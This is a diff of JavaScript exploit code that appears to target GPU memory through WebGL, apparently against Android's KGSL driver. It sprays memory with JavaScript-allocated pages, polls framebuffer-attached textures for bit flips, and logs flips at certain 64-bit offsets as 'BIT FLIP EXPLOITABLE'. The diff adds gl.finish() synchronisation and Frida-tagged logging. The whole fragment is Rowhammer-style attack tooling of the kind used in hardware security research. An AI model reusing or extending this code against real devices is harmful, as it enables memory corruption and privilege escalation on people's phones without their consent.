@@ -28,10 +28,12 @@ function initGL() {
   // gl.viewport(0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H);
 }
 
-function initFramebuffer() {
+async function initFramebuffer() {
   framebuffer = gl.createFramebuffer();
   gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);
   console.log('++ global framebuffer object initialized');
+  // gl.finish()
+  return Promise.resolve(1)
 }
 
 function createTexture2DRGBA(data, width, height) {
@@ -103,8 +105,9 @@ function createRectangle() {
 async function checkForFlip(texture) {
   // attach the texture as the first color attachment
   gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
+  gl.finish()
   while (gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
-    console.error('Framebuffer not complete! - ' + gl.checkFramebufferStatus(gl.FRAMEBUFFER));
+    // console.warn('Framebuffer not complete! - ' + gl.checkFramebufferStatus(gl.FRAMEBUFFER));
     await sleep(500);
   }
   
@@ -129,7 +132,7 @@ async function doubleCheckForFlip(kgsl_tex) {
   var pixels = (await readTexture(kgsl_tex.v_addr)).tex;
   for (let i = 0; i < KB4; i++) {
     if (pixels[i] != 0xFF) {
-      console.log(`++++ BIT FLIP IDENTIFIED`);
+      console.log(`++++ FRIDA BIT FLIP IDENTIFIED`);
       console.log(`+++ Value: ${pixels[i].toString(16)}, byte offset: ${i}, 64-bit offset: ${i % 8}`);
       if ((i % 8) > 4) {
         console.log('++++ BIT FLIP EXPLOITABLE');
@@ -155,6 +158,7 @@ function fillTexture(texture, fill=0x00) {
   gl.bindTexture(gl.TEXTURE_2D, texture);
   gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H, gl.RGBA, gl.UNSIGNED_BYTE, data);
   gl.bindTexture(gl.TEXTURE_2D, null);
+  gl.finish()
 }
 
 function createUint32Array(elements, fill=0x00000000) {
@@ -166,8 +170,8 @@ function createUint32Array(elements, fill=0x00000000) {
   return arr;
 }
 
-function allocatePage() {
-  let page = createUint32Array(KB4, 1)
+function allocatePage(i) {
+  let page = createUint32Array(KB4, i)
   window.SPAM_PAGES.push(page)
 }
 
@@ -187,9 +191,9 @@ function fill_arrays(arr, len) {
 
 
 function allocatePages(pages) {
-  console.log(`++ allocating ${pages} Javascript pages | ${pages*KB4 / MB} MB of memory `)
+  console.log(`++ [Util] allocating ${pages} Javascript pages | ${pages*KB4 / MB} MB of memory `)
   for (let i = 0; i < pages; i++) {
-    allocatePage()
+    allocatePage(i)
   }
 }
 
